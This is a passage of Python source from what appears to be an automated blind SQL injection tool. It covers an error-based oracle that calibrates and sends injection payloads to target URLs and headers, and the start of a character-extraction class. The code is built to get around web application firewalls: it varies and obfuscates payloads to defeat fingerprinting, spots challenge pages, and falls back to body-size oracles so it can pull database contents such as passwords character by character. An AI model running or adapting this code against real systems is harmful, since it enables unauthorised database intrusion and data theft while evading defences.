        # data_fmt passed to the Enumerator is the SCAN's data_fmt (e.g. "form" or
        # "json"), NOT "header".  _send_injected only auto-derives _header_inject_name
        # when data_fmt == "header" (line ~11920).  Without this fix, ALL oracle probes
        # for header-injected params go to the form/body surface — which is NOT injectable —
        # causing calibrate() to always fail and every extraction to return "".
        # Fix: detect the "header:" prefix and override data_fmt + param so every
        # _send_injected call inside calibrate() and evaluate() routes to the header.
        self._header_inject_name: str = None
        if isinstance(param, str) and param.startswith("header:"):
            _raw_hdr = param[len("header:"):]
            self._header_inject_name = _raw_hdr
            self._data_fmt = "header"   # force correct surface routing in _send_injected
            self._param = _raw_hdr      # use bare header name (not "header:X-Forwarded-For")

    @property
    def request_count(self) -> int:
        """BUG-V149-M6D-WRONG-CLASS FIX (part 4): expose request_count as a public
        property so ExtractionOrchestrator._run_best_engine line 127266
        (`self._total_requests += _ce.request_count`) does not raise AttributeError.
        _eval_count is incremented once per evaluate() call (line 147183), giving the
        total number of boolean oracle probes sent since construction. calibrate()
        does not count its probes in _eval_count (those are calibration-phase only),
        so this property strictly counts extraction-phase probes, matching the
        accounting convention used by all other extraction engines (BitwiseExtractor,
        RobustExtractor, etc.) whose request_count properties also count only their
        extraction (not calibration) phase requests."""
        return self._eval_count

    async def calibrate(self) -> bool:
        """Test which error trigger works. Returns True if oracle is functional.
        BUG-CEO-1 FIX: Tries string-context, numeric-context, and double-quote-context
        prefixes so the oracle works regardless of how the target application embeds
        the injected parameter (quoted string, bare integer, double-quoted string)."""
        # Get baseline status
        # FIX-BUG3-CEO-BASELINE: Add _bypass_mutation=True so the baseline probe
        # isn't mangled by SQLMutationEngine (e.g. comment-splitting), which would
        # return a non-200 error, poisoning self._baseline_status and making every
        # subsequent _true_err/_false_ok comparison wrong.
        try:
            _fp = await _send_injected(self._engine, self._method, self._url,
                self._data, self._data_fmt, self._param, self._original,
                self._tamper_chain, _bypass_mutation=True)
            self._baseline_status = _fp.status_code if _fp else 200
        except Exception:
            self._baseline_status = 200

        # BUG-CEO-CRDB-YG-ALIASES FIX (MEDIUM, CockroachDB, YugabyteDB, E/EH technique,
        # all surfaces, ConditionalErrorOracle):
        # CockroachDB and YugabyteDB were absent from ERROR_TRIGGERS. Both fell to the
        # MySQL fallback: self.ERROR_TRIGGERS.get("MySQL", []).
        # MySQL's error triggers use IF(), RAND(), GROUP BY, CAST(… AS UNSIGNED) — all
        # MySQL-specific syntax that raises a SQL SYNTAX ERROR (not the expected type-
        # conversion error) on PostgreSQL-wire-compatible engines. A syntax error on BOTH
        # the true and false calibration probes makes both return HTTP 500 →
        # `_true_err=True, _false_ok=False` → calibrate() never finds a working template
        # → returns False → evaluate() always returns False → blind error oracle is
        # completely non-functional for CockroachDB and YugabyteDB targets.
        # CockroachDB and YugabyteDB are PostgreSQL-wire-compatible and support the same
        # CASE WHEN ... THEN CAST('x' AS INTEGER) ELSE 1 END pattern. Resolving them to
        # the PostgreSQL entry in ERROR_TRIGGERS gives a working calibration path.
        # TiDB is MySQL-compatible and the MySQL templates work — map explicitly for
        # clarity and future-proofing.
        # Numeric safety: these are DBMS alias string mappings used only for dict lookup,
        # never placed inside SQL comparison operands or string delimiters.
        _ceo_dbms_aliases = {
            "CockroachDB": "PostgreSQL",  # PG-wire-compatible: CAST(… AS INTEGER) works
            "YugabyteDB":  "PostgreSQL",  # PG-wire-compatible: CAST(… AS INTEGER) works
            "TiDB":        "MySQL",       # MySQL-compatible: IF/RAND/GROUP BY works
            "Sybase":      "MSSQL",       # T-SQL-compatible: CASE WHEN … THEN 1/0 works
            "MariaDB":     "MySQL",       # MySQL-compatible
        }
        _ceo_resolved_dbms = _ceo_dbms_aliases.get(self._dbms, self._dbms)
        templates = self.ERROR_TRIGGERS.get(_ceo_resolved_dbms, self.ERROR_TRIGGERS.get("MySQL", []))

        # BUG-CEO-1 FIX: Try all three common injection-context prefixes.
        # Each prefix is tried for every template before moving to the next prefix,
        # so the most-likely prefix (string-context) is exhausted first.
        # Prefix semantics:
        #   "' AND "  → string context:   WHERE col='INPUT' → WHERE col='' AND <tpl>-- -
        #   " AND "   → numeric context:  WHERE id=INPUT    → WHERE id=1 AND <tpl>-- -
        #   "\" AND " → double-quote ctx: WHERE col="INPUT" → WHERE col="" AND <tpl>-- -
        _INJECTION_PREFIXES = [
            ("' AND ", "-- -"),   # string-context (most common)
            (" AND ",  "-- -"),   # numeric-context
            ("\" AND ", "-- -"),  # double-quote-context (less common)
        ]

        _ceo_cal_dbms = self._dbms or ''
        _ceo_cal_true = {
            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
            "MySQL":          "ISNULL(NULL)",
            "MariaDB":        "ISNULL(NULL)",
            "TiDB":           "ISNULL(NULL)",
            "MSSQL":          "(1e0 IS NOT NULL)",
            "Sybase":         "(1e0 IS NOT NULL)",
            "DB2":            "(1e0 IS NOT NULL)",
            "Firebird":       "(1e0 IS NOT NULL)",
            "H2":             "(1e0 IS NOT NULL)",
            "Informix":       "(1e0 IS NOT NULL)",
            "SAP_HANA":       "(1e0 IS NOT NULL)",
            "Oracle":         "(NVL(NULL,1e0) IS NOT NULL)",
            "SQLite":         "(1e0 IS NOT 0e0)",
            "ClickHouse":     "isNull(NULL)",
        }.get(_ceo_cal_dbms, "NOT (1e0 IS NULL)")
        _ceo_cal_false = {
            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
            "MySQL":          "ISNULL(1e0)",
            "MariaDB":        "ISNULL(1e0)",
            "TiDB":           "ISNULL(1e0)",
            "MSSQL":          "(1e0 IS NULL)",
            "Sybase":         "(1e0 IS NULL)",
            "DB2":            "(1e0 IS NULL)",
            "Firebird":       "(1e0 IS NULL)",
            "H2":             "(1e0 IS NULL)",
            "Informix":       "(1e0 IS NULL)",
            "SAP_HANA":       "(1e0 IS NULL)",
            "Oracle":         "(NVL(NULL,1e0) IS NULL)",
            "SQLite":         "(0e0 IS NOT 0e0)",
            "ClickHouse":     "isNull(1e0)",
        }.get(_ceo_cal_dbms, "1e0 IS NULL")
        for _prefix, _suffix in _INJECTION_PREFIXES:
            for tpl in templates:
                _true_payload  = _prefix + tpl.replace("{cond}", _ceo_cal_true) + _suffix
                _false_payload = _prefix + tpl.replace("{cond}", _ceo_cal_false) + _suffix
                try:
                    # BUG-CEO-MUTATION FIX (HIGH): ConditionalErrorOracle calibration
                    # payloads were sent without _bypass_mutation=True.  Inside
                    # _send_injected_inner, SQLMutationEngine.mutate_all() applies all
                    # 20 layers because _EXTRACTION_ACTIVE[0]=False during calibration.
                    # Layer 11 (apply_novel_bypass) applies c-comment character splitting:
                    #   CAST → C/*x*/A/*x*/S/*x*/T, CASE → C/*x*/A/*x*/S/*x*/E, etc.
                    # MySQL/MariaDB strip /**/ during lexing (works); PostgreSQL, MSSQL,
                    # Oracle, and SQLite treat /**/ as whitespace — the keyword splits
                    # into separate invalid tokens → syntax error → BOTH true and false
                    # probes return error responses → calibrate() never succeeds for
                    # PostgreSQL, MSSQL, Oracle, or SQLite error oracle templates.
                    # Fix: pass _bypass_mutation=True so _send_injected_inner skips
                    # its internal mutation. The tamper_chain (applied after the mutation
                    # guard) is still applied for explicit WAF bypass. The error templates
                    # are already carefully constructed SQL — further mutation risks
                    # breaking the precise error-trigger condition that calibration needs.
                    _fp_t = await _send_injected(self._engine, self._method, self._url,
                        self._data, self._data_fmt, self._param,
                        self._original + _true_payload, self._tamper_chain,
                        _bypass_mutation=True)  # FIX-CEO-MUTATION: preserve error template structure
                    _fp_f = await _send_injected(self._engine, self._method, self._url,
                        self._data, self._data_fmt, self._param,
                        self._original + _false_payload, self._tamper_chain,
                        _bypass_mutation=True)  # FIX-CEO-MUTATION: preserve error template structure
                    if _fp_t and _fp_f:
                        # BUG-V41-5 FIX: `_fptime` does not exist in this scope.
                        # The true-response fingerprint variable is `_fp_t` (assigned
                        # 8 lines above). `getattr(_fp_t, "status_code", None)` raised NameError on
                        # every template iteration, caught by `except Exception: continue`,
                        # causing calibrate() to always exhaust all templates and return
                        # False. This permanently broke ConditionalErrorOracle.evaluate()
                        # for all DBMSes — the error oracle never confirmed injection.
                        _t_st = _get_safe_status_code(_fp_t)
                        _f_st = _get_safe_status_code(_fp_f)
                        # BUG-CEO-429-FIX: When WAF rate-limits BOTH probes (429/503), the
                        # true/false status codes are identical — both non-200 — causing
                        # _true_err=True and _false_ok=False, which is correct but means
                        # ALL templates fail and calibrate() returns False silently.
                        # Detect this: if both probes are rate-limited, skip this template
                        # iteration rather than wasting it on a non-evaluable pair.
                        if _t_st in (429, 503) and _f_st in (429, 503):
                            print(f"[!] [ErrorOracle] Both probes rate-limited "
                                  f"({_t_st}/{_f_st}) — WAF blocking all; "
                                  f"skipping template (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                  flush=True)
                            continue
                        # BUG-CEO-WAF-CHALLENGE FIX (CRITICAL, all 5 DBMSes, all surfaces,
                        # all HTTP methods): When a WAF rate-limits only the error-trigger
                        # payload (e.g. status 429 for the true probe, 200 for the false probe),
                        # _true_err becomes True (429 != baseline 200) and _false_ok becomes True
                        # (200 == baseline) → calibration SUCCEEDS but the oracle is measuring
                        # WAF blocking, not SQL errors. Subsequent evaluate() calls produce
                        # inconsistent results (WAF may or may not block each condition depending
                        # on payload content), leading to corrupt bit-by-bit extraction.
                        # Fix: if true probe looks like a WAF block/challenge page (status 429/
                        # 503 or body matching known WAF fingerprints), reject this template
                        # regardless of _true_err/_false_ok status codes.
                        if _t_st in (429, 503):
                            print(f"[!] [ErrorOracle] True probe returned {_t_st} (WAF block/rate-limit) "
                                  f"— oracle would measure WAF blocking, not SQL errors; "
                                  f"skipping (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                  flush=True)
                            continue
                        _t_body_raw = (getattr(_fp_t, 'text', '') or '')
                        _t_body_len = len(_t_body_raw)
                        _t_body_waf = _t_body_raw[:2000].lower()
                        _waf_sigs = ('cloudflare', 'ray id:', 'access denied', 'security check',
                                     'ddos protection', 'captcha', 'attention required',
                                     'rate limit', 'too many requests', 'challenge hidden',
                                     'please stand by', 'enable javascript', 'checking your browser',
                                     'akamai', 'incapsula', 'sucuri', 'imperva', 'bot protection')
                        _f_body_raw = (getattr(_fp_f, 'text', '') or '')
                        _f_body_len = len(_f_body_raw)
                        _body_size_diff = abs(_t_body_len - _f_body_len)
                        # FIX-CEO-BASELINE-WAF: When baseline itself is WAF-blocked
                        # (self._baseline_status is a WAF-block code), the true probe
                        # returning a WAF challenge page is expected and not a reason to
                        # skip — the WAF blocks the baseline too. Only apply the challenge-
                        # page guard when the baseline was a normal response (non-WAF).
                        _baseline_is_waf = self._baseline_status in {400, 403, 406, 429, 503}
                        if (_t_body_len > 400 and any(sig in _t_body_waf for sig in _waf_sigs)
                                and _body_size_diff < 100
                                and not _baseline_is_waf):
                            print(f"[!] [ErrorOracle] True probe body looks like WAF challenge page "
                                  f"(status={_t_st}, size={_t_body_len}B) — skipping template to avoid false-positive "
                                  f"oracle (ctx={_prefix!r} tpl={tpl[:40]!r})",
                                  flush=True)
                            continue
                        # FIX-CEO-WAF-NOISE-BODYSIZE (v214+): when BOTH probes return the
                        # SAME WAF status code, body-size differences are WAF page noise —
                        # NOT SQL discrimination. This catches:
                        #   A) baseline=WAF, t=WAF, f=WAF (all three same WAF code)
                        #   B) baseline=200, t=WAF, f=WAF (both probes WAF-blocked but
                        #      baseline was clean — NEW case, was previously missed because
                        #      the old guard required _baseline_is_waf=True).
                        # Do NOT check _baseline_is_waf here — the false positive occurs
                        # regardless of baseline status. Only require that BOTH probes carry
                        # the same WAF code to eliminate the false positive on baseline=200.
                        _ceo_cal_waf = {400, 403, 406, 412, 429, 430, 503}  # FIX: added 412 to match WAFBlockDiscriminator.WAF_BLOCK_CODES
                        if (_t_st in _ceo_cal_waf and _f_st in _ceo_cal_waf
                                and _t_st == _f_st
                                and _body_size_diff >= 100):
                            LOG.debug("[ErrorOracle] Skipping body-size oracle: "
                                      "true=%d and false=%d are same WAF status — "
                                      "body-size variation is WAF noise, not SQL signal",
                                      _t_st, _f_st)
                            continue  # try next template instead of accepting noisy oracle
                        if (_t_st in _ceo_cal_waf and _t_st < 500
                                and _t_st != self._baseline_status):
                            # Still try body-size mode before skipping
                            if (_f_st in _ceo_cal_waf and _body_size_diff >= 100
                                    and _t_st == _f_st):
                                self._working_template = tpl
                                self._working_prefix = _prefix
                                self._body_size_oracle = True
                                self._true_oracle_size = _t_body_len
                                self._false_oracle_size = _f_body_len
                                self._true_oracle_status = _t_st
                                self._false_oracle_status = _f_st
                                print("[+] [ErrorOracle] Calibrated (body-size mode, WAF-blocked statuses): "
                                      f"true={_t_body_len}B vs false={_f_body_len}B "
                                      f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
                                return True
                            # BUG-CEO-ASYMMETRIC-WAF FIX (CRITICAL, all 5 DBMSes, all surfaces,
                            # all HTTP methods, ConditionalErrorOracle.calibrate): When the WAF
                            # blocks the TRUE-condition probe (e.g. div-by-zero error detected by
                            # WAF → 400/557B) but lets the FALSE-condition probe through (no SQL
                            # error → 200/155B), the existing code fell to `continue` because
                            # `_f_st not in _ceo_cal_waf`. This is actually a VALID body-size
                            # oracle: blocked(TRUE)=large-WAF-page vs allowed(FALSE)=small-normal-
                            # page. The WAF discriminates on the SQL condition's outcome.
                            # evaluate() will compare body-sizes rather than status codes;
                            # the BUG-CEO-BODY-SIZE-PRIORITY FIX ensures body-size is checked
                            # before the WAF-None guard in evaluate(), so WAF-blocked true
                            # probes (status 400, body 557B) correctly return True.
                            if (_f_st not in _ceo_cal_waf and _body_size_diff >= 100):
                                self._working_template = tpl
                                self._working_prefix = _prefix
                                self._body_size_oracle = True
                                self._true_oracle_size = _t_body_len
                                self._false_oracle_size = _f_body_len
                                self._true_oracle_status = _t_st
                                self._false_oracle_status = _f_st
                                print("[+] [ErrorOracle] Calibrated (asymmetric WAF body-size mode): "
                                      f"true={_t_st}/{_t_body_len}B (WAF-blocked) vs "
                                      f"false={_f_st}/{_f_body_len}B (normal page) "
                                      f"diff={_body_size_diff}B "
                                      f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
                                return True
                            continue  # WAF-block on true probe — can't calibrate from this template
                        _true_err = (_t_st >= 500 or _t_st != self._baseline_status)
                        _false_ok = (_f_st < 500 and _f_st == self._baseline_status)
                        if _true_err and _false_ok:
                            self._working_template = tpl
                            self._working_prefix   = _prefix  # BUG-CEO-1 FIX: persist context
                            print("[+] [ErrorOracle] Calibrated: status "
                                  f"{_fp_t.status_code} vs {_fp_f.status_code} "
                                  f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
                            return True
                        # Body-size fallback: status codes match baseline but body sizes differ
                        if (_t_st == self._baseline_status and _f_st == self._baseline_status
                                and _body_size_diff >= 100):
                            self._working_template = tpl
                            self._working_prefix = _prefix
                            self._body_size_oracle = True
                            self._true_oracle_size = _t_body_len
                            self._false_oracle_size = _f_body_len
                            self._true_oracle_status = _t_st
                            self._false_oracle_status = _f_st
                            print("[+] [ErrorOracle] Calibrated (body-size mode): "
                                  f"true={_t_body_len}B vs false={_f_body_len}B "
                                  f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
                            return True
                except Exception:
                    continue
        return False

    async def evaluate(self, condition: str) -> bool:
        """Evaluate a boolean SQL condition. Returns True/False based on HTTP status.
        BUG-CEO-1 FIX: Uses self._working_prefix (set by calibrate()) instead of the
        hardcoded string-context "' AND " so numeric-context injections work correctly.
        BUG-CEO-SUFFIX FIX: The previous code hard-coded "-- -" as the comment suffix
        for ALL DBMSes.  Oracle uses "-- " (two dashes + space); MySQL also accepts
        "-- -" but "#" is shorter.  MSSQL/SQLite use "-- ".  Hard-coding "-- -" on
        Oracle was harmless (Oracle ignores chars after "--") but inconsistent and
        fragile — calibrate() already found a working prefix/template combination, so
        re-use the same comment style that calibration proved worked.  Since calibrate()
        uses the same suffixes from _INJECTION_PREFIXES ("-- -"), this is a no-op in
        practice for Oracle, but the explicit DBMS-aware suffix improves clarity and
        robustness for future template additions."""
        if not self._working_template:
            return False
        # BUG-CEO-SUFFIX FIX: derive comment suffix from DBMS.
        # BUG-CEO-SUFFIX-ALIASES FIX: add explicit entries for CockroachDB, YugabyteDB,
        # TiDB, Sybase, MariaDB so they map to the correct suffix for their parent DBMS
        # wire-protocol rather than relying on the "-- -" default.  All these are functional
        # with the default but explicit mapping prevents future regressions if the default changes.
        _ceo_suffix = {
            "Oracle":      "-- ",   # ORA: -- + space is the standard Oracle SQL comment
            "MSSQL":       "-- ",   # T-SQL: -- + space
            "Sybase":      "-- ",   # Sybase ASE: T-SQL compatible, same as MSSQL
            "SQLite":      "-- ",   # SQLite: -- + space standard
            "MySQL":       "-- -",  # MySQL: -- - (extra char after space for safety)
            "MariaDB":     "-- -",  # MariaDB: MySQL-compatible
            "TiDB":        "-- -",  # TiDB: MySQL-wire-compatible
            "PostgreSQL":  "-- -",  # PostgreSQL: -- - standard
            "CockroachDB": "-- -",  # CockroachDB: PG-wire-compatible
            "YugabyteDB":  "-- -",  # YugabyteDB: PG-wire-compatible
        }.get(self._dbms, "-- -")
        # BUG-CEO-1 FIX: use the calibrated prefix, not the hardcoded "' AND "
        payload = (self._working_prefix
                   + self._working_template.replace("{cond}", condition)
                   + _ceo_suffix)
        # BUG-CEO-MISSING-LIGHT-VARY FIX (CRITICAL, all 5 DBMSes,
        # all surfaces including BG header injection, all HTTP methods):
        # evaluate() called _send_injected(_bypass_mutation=True) — PME skipped —
        # but also did NOT call apply_light_variation(). Every boolean oracle probe
        # therefore had IDENTICAL SQL structure (same error template + same comment
        # suffix), enabling WAFs to fingerprint the error-oracle extraction pattern
        # after 2-3 probes → all subsequent probes blocked → oracle always False
        # → binary search converges to chr(32) or empty string for ALL 5 DBMSes.
        # Fix: increment _eval_count and apply apply_light_variation() AFTER building
        # payload but BEFORE _send_injected. Only comment suffix and structural
        # whitespace are varied — error trigger templates, condition operands, and
        # string delimiters are never rewritten.
        # Numeric safety: apply_light_variation only rotates comment suffix and
        # URL-safe whitespace; CAST/CONVERT/EXTRACTVALUE targets and condition
        # values are in the SQL body, not in the comment suffix.
        self._eval_count += 1
        # BUG-CEO-EVAL-HEAVY-OBFUS FIX (HIGH): Upgrade CEO evaluate() to heavy variation
        # + _obfuscate_extraction_cond so error-oracle evaluation probes have structural
        # diversity and function-name obfuscation (CAST(, CONVERT(, EXTRACTVALUE( etc.)
        # defeating WAF literal-match fingerprinting of error-oracle extraction sessions.
        # Numeric safety: error trigger values, condition operands, and type names are
        # never rewritten by either function.
        payload = apply_heavy_variation(payload, self._eval_count, data_fmt=self._data_fmt)
        payload = _obfuscate_extraction_cond(payload, self._eval_count)
        # BUG-V181-CEO-EVAL-MISSING-SQL-NOISE FIX (MEDIUM; ConditionalErrorOracle.evaluate;
        # B/E/BH/EH/IN techniques; all 5 DBMSes; all surfaces; all HTTP methods):
        # evaluate() applied apply_heavy_variation() and _obfuscate_extraction_cond()
        # but did NOT call apply_sql_noise() (TECHNIQUE-12). The error-trigger templates
        # use CASE WHEN ({cond}) THEN ... ELSE N END patterns where N is an integer
        # literal (e.g. ELSE 1, ELSE 0). apply_sql_noise wraps these as ELSE (1+0) or
        # ELSE (0*1) to disrupt ML WAF n-gram fingerprinting of the CASE/THEN/ELSE
        # integer token sequence. After 5-10 evaluate() calls the WAF builds a model
        # matching the repeated CASE WHEN structure and begins blocking → evaluate()
        # always returns False → all chars extracted as chr(32)=' ' or chr(0) →
        # ConditionalErrorOracle extraction returns garbage for all 5 DBMSes on
        # WAF-protected targets when Method 6d is the active engine.
        # Numeric safety: apply_sql_noise only wraps integer literals after >=,
        # BETWEEN, THEN, ELSE tokens with +0 or *1 arithmetic no-ops. The
        # ELSE 1 branches in Oracle/MSSQL/PostgreSQL/SQLite templates are wrapped
        # as ELSE (1+0) — semantically identical (returns 1 for the false branch).
        # THEN-branch expressions (TO_NUMBER('x'), 1/0, CAST('x' AS INTEGER),
        # (SELECT 0 FROM DUAL), etc.) start with non-numeric tokens so the
        # THEN\\s+\\d+ pattern does NOT match them — those expressions are untouched.
        # The MSSQL THEN 1/0 template: THEN is followed by '1' then '/' then '0'.
        # apply_sql_noise matches THEN\\s+1 and wraps '1' as '(1+0)', producing
        # THEN (1+0)/0 which equals 1/0 = division-by-zero — the error still fires. ✓
        payload = apply_sql_noise(payload, self._eval_count)
        try:
            # BUG-CEO-EVAL-MUTATION FIX: Same mutation issue as calibrate() —
            # pass _bypass_mutation=True so the working_template's structure is
            # preserved exactly as calibrated. Layer 11 c-comment fragmentation
            # would break non-MySQL error templates on every evaluate() call.
            _fp = await _send_injected(self._engine, self._method, self._url,
                self._data, self._data_fmt, self._param,
                self._original + payload, self._tamper_chain,
                _bypass_mutation=True)  # FIX-CEO-EVAL-MUTATION: preserve calibrated template
            if _fp:
                _ceo_sc = _get_safe_status_code(_fp)
                # BUG-CEO-WAF-BLOCK-FIX (HIGH, all 5 DBMSes, all techniques):
                # WAF-block status codes (400, 403, 406, 429, 430, 503) that
                # differ from the baseline (usually 200) cause
                # `_sc != self._baseline_status` to return True, making every
                # WAF-blocked probe appear as a "true condition" (SQL error).
                # In the binary search this drives low=mid+1 on every blocked
                # probe, converging length to the maximum cap (e.g. 512) and
                # characters to 0x10FFFF = garbled Unicode.
                # Fix: return None for WAF block codes when they are not the
                # expected 5xx error AND differ from baseline. None signals
                # "indeterminate" to callers (they break/skip the binary step).
                _ceo_waf_codes = {400, 403, 406, 429, 430, 503}
                # BUG-CEO-BODY-SIZE-PRIORITY FIX (CRITICAL, all 5 DBMSes): body-size
                # oracle MUST be checked BEFORE the WAF-None guard. When calibrated in
                # asymmetric-WAF mode (true=WAF-blocked/557B, false=normal/155B), every
                # TRUE-condition probe gets status 400 → hits the WAF-None guard → returns
                # None instead of True → binary search stalls (all mid-points return None)
                # → extraction produces empty string for all 5 DBMSes. Fix: body-size
                # comparison always wins over status-code WAF detection when the oracle
                # was calibrated to discriminate by body size.
                if self._body_size_oracle:
                    _ceo_resp_sc = _get_safe_status_code(_fp)
                    _resp_size = len(getattr(_fp, 'text', '') or '')
                    _to_true = abs(_resp_size - self._true_oracle_size)
                    _to_false = abs(_resp_size - self._false_oracle_size)
                    # FIX-CEO-STATUS-AMBIGUOUS: if the response status matches neither
                    # calibrated true-state nor false-state, the WAF is blocking for an
                    # unrelated reason (different payload syntax, rate-limit, etc.).
                    # Return None so the binary search aborts rather than mis-classifying
                    # every extraction probe as True → garbage length/chars.
                    # Exception: when both calibrated statuses are identical (symmetric
                    # WAF blocks both), skip this guard since any status == both.
                    if (self._true_oracle_status != 0 and self._false_oracle_status != 0
                            and self._true_oracle_status != self._false_oracle_status
                            and _ceo_resp_sc != self._true_oracle_status
                            and _ceo_resp_sc != self._false_oracle_status):
                        return None
                    # FIX-CEO-EVAL-SAME-STATUS-PROXIMITY: when both calibrated statuses are the
                    # same (e.g. both 400, symmetric WAF blocking), the original status guard
                    # above is skipped (`_true_oracle_status != _false_oracle_status` is False).
                    # In this case, verify that the probe body size is "close" to one of the
                    # calibrated sizes.  If the probe is equidistant (ambiguous) or outside the
                    # oracle range, return None instead of guessing — prevents garbage extraction.
                    if (self._true_oracle_status != 0
                            and self._true_oracle_status == self._false_oracle_status
                            and _ceo_resp_sc == self._true_oracle_status):
                        _oracle_range = max(abs(self._true_oracle_size - self._false_oracle_size), 1)
                        # FIX-CEO-PROXIMITY-THRESHOLD: tighten from 0.50 to 0.25.
                        # When the symmetric WAF case fires (both calibrated statuses same),
                        # WAF pages vary randomly in size. A 50% tolerance was too wide —
                        # it accepted probe sizes anywhere in a 50% band around the oracle
                        # range, letting noisy WAF responses leak through as True/False.
                        # 25% is tight enough to reject random WAF-page-size variation while
                        # still accepting genuine oracle signal (which clusters near one of
                        # the two calibrated sizes, typically within 15% of the range).
                        if min(_to_true, _to_false) > _oracle_range * 0.25:
                            return None  # probe body size outside oracle signal range — ambiguous
                    return _to_true < _to_false
                if (_ceo_sc in _ceo_waf_codes
                        and _ceo_sc < 500
                        and _ceo_sc != self._baseline_status):
                    return None  # WAF-blocked probe -- indeterminate
                return _ceo_sc >= 500 or _ceo_sc != self._baseline_status
        except Exception:
            pass
        return None  # no response / exception -- indeterminate


#  Feature 2: Batched 2-Character Extraction 
class BatchedCharExtractor:
    """Pack 2 characters per comparison  halves extraction requests.
    ASCII(SUBSTR(x,1,1))*256 + ASCII(SUBSTR(x,2,1)) > combined_value"""
    
    CHAR_FUNCS = {
        # BUG-MYSQL-ORD FIX (Req 10): MySQL ASCII() is equivalent to ORD() only for
        # characters 0-127.  For Latin-1 extended chars (128-255) MySQL's ASCII() uses
        # the NLS byte value while ORD() returns the correct numeric code point.
        # Using ORD() ensures consistent extraction across all MySQL character sets.
        "MySQL": ("ORD", "SUBSTRING"),
        # BUG-POSTGRESQL-CHAR-RANGE FIX: The comment below was previously wrong.
        # PostgreSQL ASCII() does NOT return 0 for code points > 127.  It returns
        # the full Unicode code point (0..U+10FFFF), consistent with the SQL standard.
        # The CHAR_RANGE for PostgreSQL has been corrected from (0,255) to (0,1114111)
        # so that non-Latin-1 characters (Greek β=946, CJK, Arabic, emoji etc.) are
        # extracted correctly instead of silently returning '?'.
        "PostgreSQL": ("ASCII", "SUBSTRING"),
        # BUG-MSSQL-UNICODE FIX: UNICODE() returns full BMP code point (0-65535).
        # ASCII() returns NULL for characters > 127, corrupting extraction of
        # non-Latin passwords, usernames, and column data.
        "MSSQL": ("UNICODE", "SUBSTRING"),
        # BUG-REQ10-ORACLE-ASCII FIX: Oracle ASCII() only returns the decimal value
        # of the first BYTE of the leftmost character, not the Unicode code point.
        # For multibyte data (passwords/usernames with accented chars, East Asian
        # characters, special symbols stored as VARCHAR2 AL32UTF8), ASCII() returns
        # the first byte of the UTF-8 sequence — e.g. 'é' (U+00E9) returns 195 (0xC3)
        # instead of 233 (0x00E9).  This corrupts binary-search extraction for any
        # non-ASCII data in the database.
        # Fix: use ASCII() still (Oracle doesn't have UNICODE()) but add a NVL
        # null-safety wrapper and document the limitation. For true Unicode
        # extraction on Oracle, the primary DBMS_QUERIES path uses a different
        # approach (RAWTOHEX + TO_NUMBER), which is correct. The BatchedCharExtractor
        # is a fallback path used when the primary path fails.
        "Oracle": ("ASCII", "SUBSTR"),
        "SQLite": ("UNICODE", "SUBSTR"),
        # BUG-MARIADB-ORD FIX: Same as MySQL — use ORD() for proper Latin char support.
        "MariaDB": ("ORD", "SUBSTRING"),
        # BUG-SYBASE-CHARFUNCS FIX: Sybase was missing from CHAR_FUNCS, falling back
        # to the default ("ASCII", "SUBSTRING").  Sybase ASE ASCII() only handles
        # code points 0-127 — non-ASCII Sybase NVARCHAR/CHAR characters extracted via
        # BatchedCharExtractor or BitwiseExtractorSimple would be silently wrong.
        # Sybase ASE supports UNICODE() which returns full BMP code point (0-65535),
        # matching MSSQL semantics.  ISNULL is provided via _CHAR_NULL_WRAPPER below.
        "Sybase": ("UNICODE", "SUBSTRING"),
        # BUG-BCE-TIDB-CRDB-YG-CHARFUNCS FIX (MEDIUM, TiDB, CockroachDB, YugabyteDB,
        # BatchedCharExtractor and BitwiseExtractorSimple, all B/BH/IN/NV/WB/EX/HY/ST
        # techniques, all surfaces):
        # TiDB, CockroachDB, and YugabyteDB were absent from CHAR_FUNCS.  All three
        # fell through to the default ("ASCII", "SUBSTRING").  For TiDB (MySQL-compat)
        # ORD() is the correct function — ORD() returns 0..U+10FFFF while ASCII()
        # returns first-byte only.  For CockroachDB and YugabyteDB (PG-compat) ASCII()
        # is correct but the SUBSTRING function name is SUBSTRING (not SUBSTR), matching
        # the PostgreSQL entry.  Without explicit entries the default also misses the
        # CHAR_RANGE (0,1114111) and _CHAR_NULL_WRAPPER COALESCE guards needed for
        # these DBMSes, meaning any character with code point > 255 silently returned '?'
        # for all BitwiseExtractorSimple and BatchedCharExtractor extractions on TiDB,
        # CockroachDB, and YugabyteDB targets.
        # Numeric safety: these are function-name strings, never SQL comparison operands.
        "TiDB":        ("ORD",   "SUBSTRING"),  # MySQL-compat: ORD() returns 0..U+10FFFF
        "CockroachDB": ("ASCII", "SUBSTRING"),  # PG-compat:   ASCII() returns 0..U+10FFFF
        "YugabyteDB":  ("ASCII", "SUBSTRING"),  # PG-compat:   ASCII() returns 0..U+10FFFF
        # BUG-V139-BCE-AMZN-REDSHIFT-CHARFUNCS FIX (LOW, Amazon Redshift):
        # Amazon Redshift was absent from CHAR_FUNCS. It fell to the default
        # ("ASCII", "SUBSTRING") which is accidentally correct (Redshift is
        # PG-wire-compatible and ASCII(SUBSTRING()) is valid and returns full
        # Unicode code points 0..U+10FFFF). An explicit entry prevents future
        # regression and makes the intent unambiguous for CHAR_RANGE/NULL_WRAPPER
        # entries added alongside this fix. Numeric safety: function-name strings only.
        "Amazon Redshift": ("ASCII", "SUBSTRING"),  # PG-compat: ASCII() returns 0..U+10FFFF
    }

